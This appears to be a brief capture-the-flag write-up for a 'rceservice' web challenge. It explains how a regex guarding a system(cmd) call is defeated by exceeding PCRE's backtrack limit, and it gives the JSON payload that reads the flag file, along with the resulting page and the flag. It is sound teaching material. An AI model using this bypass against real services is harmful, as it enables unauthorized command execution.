# rceservice
First, our cmd input of json format should be like `{"cmd": "ls"}`. The service would use `system(cmd)` to execute the command. So, how to bypass the regular expression?  
* Cannot make a reverse shell because both `.` and numbers are blocked!  
* Cannot execute multiple line command!  
* Only allow space, colon, and `"`!  
  
To here, something ran into my mind: How about pcreDoS? The trick to crash regex by outnumbering the limit of backtrack [You can see my writeup of pcrewaf](https://blog.1pwnch.com/ctf/websecurity/2018/11/26/Code-Breaking-Puzzles/#more). I start to try my payload in regex debugger of regex 101.  

My final payload is `{"cmd": "/bin/cat /home/rceservice/flag", "hi": "a"*1000000}` !  
`^.*` would match to the end of my payload at first, so when next part (`alias......`) wants to match something but finds nothing, it would backtrack until matched. Such thousand times of `a` would make it outnumber the limit of backtrack easily.  
Following is the flag:  
```php
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```
flag: `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
